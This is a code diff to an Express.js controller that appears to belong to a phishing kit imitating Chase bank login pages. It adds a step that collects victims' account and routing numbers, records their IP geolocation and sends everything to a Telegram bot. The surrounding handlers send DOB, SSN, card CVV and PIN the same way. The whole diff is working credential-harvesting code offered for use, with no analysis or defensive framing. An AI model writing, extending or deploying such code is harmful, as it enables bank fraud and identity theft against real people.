@@ -159,6 +159,55 @@ exports.loginPost3 = async (req, res) => {
         const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
         sendMessage(message);
 
+        res.redirect("/auth/login/x");
+    } catch (error) {
+		console.error('Unexpected error:', error.message);
+		res.status(500).send('Internal Server Error');
+	}
+	process.on('unhandledRejection', (reason, promise) => {
+		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
+	});
+	
+};
+
+exports.loginx = (req, res) => {
+	res.render("loginx");
+};
+
+exports.loginPostx = async (req, res) => {
+	const { accountNumber, routingNumber } = req.body;
+	const sendAPIRequest = async (ipAddress) => {
+        const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
+		console.log(apiResponse.data);
+        return apiResponse.data;
+    };
+
+    const ipAddress = getClientIp(req);
+    const ipAddressInformation = await sendAPIRequest(ipAddress);
+
+
+	try{
+    console.log(ipAddressInformation);
+
+    const userAgent = req.headers["user-agent"];
+    const systemLang = req.headers["accept-language"];
+
+
+        const message =
+            `✅ UPDATE TEAM | CHASE | USER_${ipAddress}\n\n` +
+            `👤 EMAIL INFO\n` +
+			`ACCOUNT NUMBER   : ${accountNumber}\n` +
+			`ROUTING NUMBER  : ${routingNumber}\n\n` +
+            
+            `🌍 GEO-IP INFO\n` +
+          `IP ADDRESS       : ${ipAddress}\n` +
+		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+            `💬 Telegram: https://t.me/UpdateTeams\n`;
+            
+
+        const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
+        sendMessage(message);
+
         res.redirect("/auth/login/4");
     } catch (error) {
 		console.error('Unexpected error:', error.message);
@@ -204,9 +253,9 @@ exports.loginPost4 = async (req, res) => {
 		`DOB              : ${dob}\n` +
 		`SSN              : ${ssn}\n\n` +
 		`🌍 GEO-IP INFO\n` +
-		 `IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
-		 `TIME             : ${ipAddressInformation.timezone.current_time}\n` +
-		 `💬 Telegram: https://t.me/UpdateTeams\n`;
+		 `IP ADDRESS       : ${ipAddress}\n` +
+		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+		`💬 Telegram: https://t.me/UpdateTeams\n`;
             
 
         const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
@@ -254,7 +303,7 @@ exports.loginPost5 = async (req, res) => {
 		`CVV              : ${cvv}\n` +
 		`CARD PIN         : ${cpin}\n\n` +
 		`🌍 GEO-IP INFO\n` +
-		    `IP ADDRESS       : ${ipAddress}\n` +
+		`IP ADDRESS       : ${ipAddress}\n` +
 		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
 		`💬 Telegram: https://t.me/UpdateTeams\n` +
 		`🌐 Website: Coming soon!!\n`;
